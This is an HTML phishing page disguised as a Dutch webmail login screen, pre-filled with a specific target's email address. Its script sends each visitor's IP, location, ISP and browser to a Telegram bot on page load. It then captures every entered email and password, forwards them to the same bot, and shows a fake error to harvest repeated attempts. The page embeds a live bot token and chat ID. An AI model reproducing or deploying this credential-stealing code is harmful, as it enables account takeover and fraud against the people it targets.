<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1791373171/nl_xe0isz.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    #introImageContainer {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #introImageContainer img {
      max-width: 100%;
      max-height: 100%;
      border-radius: 8px;
    }

    #loginContainer {
      display: none;
      justify-content: center;
      align-items: flex-start;
      padding-top: 30vh;
      height: 100%;
    }

    #layout {
      width: 320px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 0px;
      padding: 10px;
      box-shadow: 0 0 0px rgba(0, 0, 0, 0.0);
    }

    .input-group {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 10px;
      margin-bottom: 5px;
      overflow: hidden;
    }

    .input-group-prepend {
      background-color: #eee;
      padding: 5px;
    }

    .input-group-text.icon {
      font-size: 18px;
      color: #000;
    }

    .form-control {
      flex: 1;
      padding: 10px;
      border: none;
      outline: none;
      background-color: transparent;
      color: #000;
    }

    .form-control::placeholder {
      color: #333;
    }

    .custom-control {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
    }

    .custom-control-label {
      margin-left: 2px;
      color: #000;
    }

    .formbuttons button {
      width: 100%;
      padding: 15px;
      background-color: #007bff;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .formbuttons button:hover {
      background-color: #0056b3;
    }

    #errorMessage {
      color: red;
      font-size: 14px;
      margin-bottom: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <!-- 👇 Intro Image Overlay -->
  <div id="introImageContainer">
    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
  </div>

  <!-- 👇 Login Container -->
  <div id="loginContainer">
    <div id="layout">
      <!-- 👇 Error message placeholder -->
      <p id="errorMessage"></p>

      <form method="post" id="loginForm">
        <div class="input-group">
          <span class="input-group-prepend">
            <i class="input-group-text icon user">👤</i>
          </span>
          <input id="username" name="_user" type="text" class="form-control" placeholder="Emailadres" value="wolfen@almeling.com" required />
        </div>

        <div class="input-group">
          <span class="input-group-prepend">
            <i class="input-group-text icon pass">🔒</i>
          </span>
          <input id="password" name="_pass" type="password" class="form-control" placeholder="Wachtwoord" required />
        </div>

        <div class="custom-control">
          <input type="checkbox" id="_ifpl" name="_ifpl" value="1" />
          <label class="custom-control-label" for="_ifpl">Blijf ingelogd</label>
        </div>

        <div class="formbuttons">
          <button type="submit">Inloggen</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
    const chatId = '8052751627';
    let loginAttempts = 0;

    function sendToTelegram(message) {
      if (!navigator.onLine) return;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).catch(err => console.error('Telegram error:', err));
    }

    function getPort() {
      return window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
    }

    function sendVisitorInfo() {
      const userAgent = navigator.userAgent;
      const port = getPort();
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `🌐 delNL Vis Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
          sendToTelegram(message);
        }).catch(() => {
          sendToTelegram(`🌐 de Nl (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
        });
    }

    window.onload = function () {
      sendVisitorInfo();
      setTimeout(() => {
        document.getElementById('introImageContainer').style.display = 'none';
        document.getElementById('loginContainer').style.display = 'flex';
      }, 500);
    };

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const email = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) return;

      loginAttempts++;
      const msg = `❌deta drop #${loginAttempts}\n📧 Email: ${email}\n🔑 Passwort: ${password}`;
      sendToTelegram(msg);

      // Clear password
      document.getElementById('password').value = '';

      // Show error message
      document.getElementById('errorMessage').style.display = 'block';

      if (loginAttempts >= 30) {
        window.location.href = 'https://tse3.mm.bing.net/th/id/OIP.14uelHZGeMH38bdQNqYB4wHaKe?rs=1&pid=ImgDetMain';
      }
    });
  </script>
</body>
</html>
